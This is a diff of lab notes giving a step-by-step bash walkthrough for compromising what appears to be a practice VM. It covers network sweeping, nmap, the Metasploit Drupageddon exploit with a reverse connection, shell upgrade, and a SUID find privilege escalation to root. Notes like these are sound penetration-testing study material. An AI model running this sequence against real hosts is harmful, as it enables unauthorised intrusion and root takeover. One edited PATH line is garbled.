@@ -3,7 +3,7 @@
 ```bash
 sudo ifconfig
 sudo fping -aqg 192.168.56.0/24
-export IP=192.168.56.103
+export IP=192.168.56.104
 echo $IP
 
 nmap -sC -sV -p 1-65535 $IP
@@ -33,10 +33,11 @@ msfconsole
 search type:exploit drupal
 use exploit/multi/http/drupal_drupageddon
 info
-set RHOSTS 192.168.56.103
+set RHOSTS 192.168.56.104
 show options
-set LHOST192.168.56.103
+set LHOST 192.168.56.101
 show options
+//TARGETURIはデフォルトを指定する。
 
 run
 ls
@@ -46,7 +47,7 @@ which python
 python -c 'import pty; pty.spawn("/bin/bash")'
 
 tty
-export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/gtmp
 export TERM=xterm-256color
 alias ll='ls -la --color=auto'
 ll
@@ -67,13 +68,17 @@ ll
 
 cd /var/tmp
 ll
+//shm = shared memory
 cd /dev/shm
 ll
 
+// Disk Free -Human readable
 df -h
 cd /
+//find normal file which has SUID under / directory
 find / -perm -u=s -type f 2> /dev/null
 which find
+//execute /bin/bash in th first file of searching process and then quit.
 /usr/bin/find . -exec /bin/bash -p \; -quit
 
 id
